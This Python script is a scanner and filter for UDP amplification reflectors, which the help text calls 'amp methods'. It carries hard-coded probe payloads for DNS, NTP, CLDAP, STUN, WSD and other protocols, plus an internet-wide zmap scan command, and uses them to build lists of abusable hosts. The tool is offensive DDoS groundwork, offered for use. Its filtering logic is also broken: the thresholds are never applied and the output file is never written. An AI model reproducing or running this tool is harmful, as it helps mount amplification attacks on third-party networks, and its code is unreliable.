import subprocess
import datetime
import random
import socket
import time
import sys
import os
import re
import shutil
import binascii
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Process

# Defining some essentials
listnerOutputFile = 'listener.tmp'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
startTime = datetime.datetime.now()
os.system('clear')

# Pull args into list
sysArgs = sys.argv[1:]

# Defining program modes
programModes = ['--scan', '--filter']
programArgs = ['--scan', '--filter', '--input', '-i', '--output', '-o', '--threads', '-t', '--amp', '--byte', '--transmits', '--all']

# Defining method info [Port, Min-byte, Payload]
methodList = {}
# pitt.edu
methodList["dns"] = [53, 3800, b"\xf1\xe8\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x0c\x00\x0a\x00\x08\xc0\x4e\xd3\x88\xf7\x91\x6b\xb6"]
methodList["ntp"] = [123, 5000, b"\x17\x00\x03\x2a\x00\x00\x00\x00"]
methodList["cldap"] = [389, 3000, b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00"]
methodList["dvr"] = [37810, 600, b"y"]
methodList["wsd"] = [3702, 800, b"<:>"]
methodList["cip"] = [41794, 394, b"\x14"]
methodList["ard"] = [3283, 100, b"\x00\x14\x00\x00"]
methodList["stun"] = [3478, 2000, b"\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"]
methodList["ldap"] = [389, 0, b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00"]
methodList["ipsec"] = [500, 100, b"\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"]
methodList["afs"] = [7001, 100, b"\x00\x00\x03\xe7\x00\x00\x00\x00\x00\x00\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x0d\x05\x00\x00\x00\x00\x00\x00\x00"]
methodList["openvpn"] = [1194, 100, b"\x38"]

# Defining program functions
def usageHelp():
    print('Scanning and filtering script (for amp methods) by @oParoxysm')
    print('Program help for {0}'.format(sys.argv[0]))
    print('Payloads can be added or modified inside this script.')
    print()
    print('Example usage:')
    print('python3 {0} --filter ntp --input ntp.txt --output ntpf.txt --threads 2'.format(sys.argv[0]))
    print('python3 {0} --filter dns -i unfiltered/dns.txt -o filtered/dnsf.txt -t 500'.format(sys.argv[0]))
    print('python3 {0} --scan dns ntp ldap wsd -t 200'.format(sys.argv[0]))
    print('python3 {0} --scan chargen'.format(sys.argv[0]))
    print()
    print('Program modes:')
    print('--filter                 Requires: method, --input, --output')
    print('                         Info: Sends hard-coded payload to each vector inside')
    print('                         input file, benchmarks each response, and filters accordingly')
    print()
    print('--scan                   Requires: method or list of methods')
    print('                         Info: Uses zmap and UDP listener to make new lists')
    print('                         using hard-coded payload')
    print()
    print('Program options:')
    print('--input, -i              Needs to be followed by input file')
    print('  [filter mode only]     Example:  --input dns.txt')
    print()
    print('--output, -o             Needs to be followed by output file')
    print('  [filter mode only]     Example:  --output dnsf.txt')
    print()
    print('--amp                    Needs to be followed by minimum amp to filter by')
    print('  [filter mode only]     Default:  Hard-coded (Varies by method)')
    print('                         Example:  --amp 60')
    print()
    print('--byte                   Needs to be followed by minimum byte to filter by')
    print('  [filter mode only]     Default:  Hard-coded (Varies by method)')
    print('                         Example:  --byte 4000')
    print()
    print('--threads, -t            Needs to be followed by thread count')
    print('                         Info: Lower threads will give more accurate results (especially for NTP)')
    print('                         ** You should not need to increase thread count unless using --transmits**')
    print('                         Default:  1')
    print('                         Example:  --threads 25')
    print('                         Suggestion:  Use low threads for NTP or any method with a small vector count')
    print()
    print('--transmits              Needs to be followed by number of times to probe each vector')
    print('                         Info: If transmit is 10, program will probe each vector 10 over the course of 1 second')
    print('                         Default:  1')
    print('                         Example:  --transmits 10')
    exit(0)

def printError(error):
    print("Error: {0}".format(error))
    usageHelp()
    exit(0)

def dataListener(port):
    try:
        print("Listening port: {0}".format(port))
        with open(listnerOutputFile, 'w', 1) as file:
            while True:
                data, address = s.recvfrom(8192)
                if address[1] == methodPort:
                    file.write("{0},{1},{2}\n".format(address[0], address[1], len(data)))
    except Exception as e:
        printError("Failed binding to listening port - {0}".format(e))

def dataSender(line):
    ip = re.findall(r'(?:\d{1,3}\.)+(?:\d{1,3})', line)
    vector = ip[0]
    if vector:
        for _ in range(transmits):
            s.sendto(methodPayload, (vector, methodPort))
            if transmits > 1:
                time.sleep(1 / transmits)
        print("Sent payload to '{0}'".format(vector))
        time.sleep(.01)

def killListener():
    try:
        listener.kill()
    except:
        listener.terminate()

def cleanFiles():
    fileList = listnerOutputFile, outputFile
    for file in fileList:
        try:
            os.remove(file)
        except:
            pass

# Function to move output file to /root/allowed-files
def moveOutputFile():
    try:
        destination_dir = '/root/allowed-files'
        if not os.path.exists(destination_dir):
            os.makedirs(destination_dir)
        shutil.move(outputFile, os.path.join(destination_dir, outputFile))
        print(f"Output file moved to: {destination_dir}/{outputFile}")
    except Exception as e:
        print(f"Error moving the output file: {e}")

# Pull methods from arg list
methodQueue = []
programMode = []
if '-h' in sysArgs or '--help' in sysArgs or len(sysArgs) == 0:
    usageHelp()
for arg in sysArgs:
    if arg in methodList:
        methodQueue.append(arg)
    if arg in programModes:
        programMode = arg.strip('--')
    if '-' in arg and arg not in programArgs:
        printError("Passed argument is invalid ({0})".format(arg))
    if arg == '--all':
        for method in methodList:
            methodQueue.append(method)

# Checking if method was passed
if len(methodQueue) > 0:
    print("Methods specified: {0}".format(', '.join(methodQueue)))
else:
    printError("Method was not passed into args. Please specify a method (Example: NTP, DNS, CHARGEN)")

# Checking if mode was passed and pulling args
if len(programMode) > 0:
    print("Program mode: {0}".format(programMode))
    argsAmp = 0
    argsByte = 0
    transmits = 1
    programThreads = 5
    if '--transmits' in sysArgs:
        transmits = int(sysArgs[sysArgs.index('--transmits') + 1])
    if '--threads' in sysArgs:
        programThreads = int(sysArgs[sysArgs.index('--threads') + 1])
    print("Thread count: {0}".format(programThreads))
    if programMode == 'filter':
        if len(methodQueue) > 1:
            printError("Can only filter one method at a time")

        # Getting args unique to filter
        if '--amp' in sysArgs:
            argsAmp = int(sysArgs[sysArgs.index('--amp') + 1])
        if '--byte' in sysArgs:
            argsByte = int(sysArgs[sysArgs.index('--byte') + 1])

        # Getting input file
        if '--input' in sysArgs:
            inputFile = sysArgs[sysArgs.index('--input') + 1]
        elif '-i' in sysArgs:
            inputFile = sysArgs[sysArgs.index('-i') + 1]
        else:
            printError("Please specify input and while using filter mode (-i or --input)")
        if not os.path.isfile(inputFile):
            printError("Input file does not exist")
        else:
            print("Input:   {0}".format(inputFile))

        # Getting output file
        if '--output' in sysArgs:
            outputFile = sysArgs[sysArgs.index('--output') + 1]
        elif '-o' in sysArgs:
            outputFile = sysArgs[sysArgs.index('-o') + 1]
        else:
            printError("Please specify input and while using filter mode (-i or --input)")
        print("Output:   {0}".format(outputFile))
    elif programMode == 'scan':
        pass
    else:
        printError("Program mode does not exist")
else:
    printError("Program mode not passed. Please specify {0}".format(', '.join(programModes)))

# Loop for each method
for method in methodQueue:
    if programMode == 'scan':
        outputFile = '{0}f.txt'.format(method)
    
    # Cleaning files
    cleanFiles()
    if os.path.isfile(outputFile):
        os.remove(outputFile)

    # Pulling info for the method
    methodPort = methodList[method][0]
    methodByte = methodList[method][1]
    methodPayload = methodList[method][2]
    methodPayloadHex = str(binascii.hexlify(methodPayload)).strip("'b").upper()

    # Random listening port
    listeningPort = random.randint(1024, 65500)

    # Starting UDP listener thread
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ('0.0.0.0', int(listeningPort))
    s.bind(server_address)
    listener = Process(target=dataListener, args=(listeningPort,))
    listener.start()
    time.sleep(1)

    # Only performing tasks for program mode
    if programMode == 'filter':
        inputList = open(inputFile, 'r').read().splitlines()
        totalVectors = len(inputList)
        print("Count of vectors: {0}".format(totalVectors))
        with ThreadPoolExecutor(programThreads) as executor:
            executor.map(dataSender, inputList)
    elif programMode == 'scan':
        totalVectors = 0
        zmapCommand = """zmap -B 200M -T 2 -p {0} -f "saddr udp_pkt_size" --output-filter='sport={0}' -s {1} -M udp --probe-args=hex:{2} -o /dev/null -c 0""".format(methodPort, listeningPort, methodPayloadHex)
        os.system(zmapCommand)

    # Sleep delay for UDP listener
    timeToSleep = 5
    for x in range(timeToSleep):
        print("Waiting for {0} more seconds to finish".format(timeToSleep - x))
        time.sleep(1)

    # Move the output file to /root/allowed-files
    moveOutputFile()

    # Stop listener
    killListener()
